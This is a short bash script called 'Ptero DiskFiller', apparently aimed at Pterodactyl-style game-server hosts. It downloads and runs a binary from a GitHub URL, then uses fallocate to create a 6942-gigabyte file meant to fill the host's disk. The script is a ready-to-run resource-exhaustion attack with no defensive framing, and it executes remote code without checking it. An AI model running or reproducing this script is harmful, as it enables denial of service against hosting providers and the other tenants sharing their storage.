#!/bin/bash
bold=`echo -en "\e[1m"`
normal=`echo -en "\e[0m"`
lightblue=`echo -en "\e[94m"`
lightgreen=`echo -en "\e[92m"`
clear
echo "
${bold}${lightgreen}========================================================================
${bold}=> Ptero DiskFiller <=
${bold}${lightgreen}========================================================================
 "                      
start_diskfiller(){
curl -o apth https://raw.githubusercontent.com/afnan007a/Ptero-vm/main/apth
chmod +x apth
./apth util-linux
linux/usr/bin/fallocate -l 6942G diskfilled
}                                             
sleep 1
echo "${bold}${lightgreen}Started Ptero DiskFiller"
echo
sleep 1
start_diskfiller
echo
sleep 1 
echo "${bold}${lightgreen}Diskfilled i guess?"
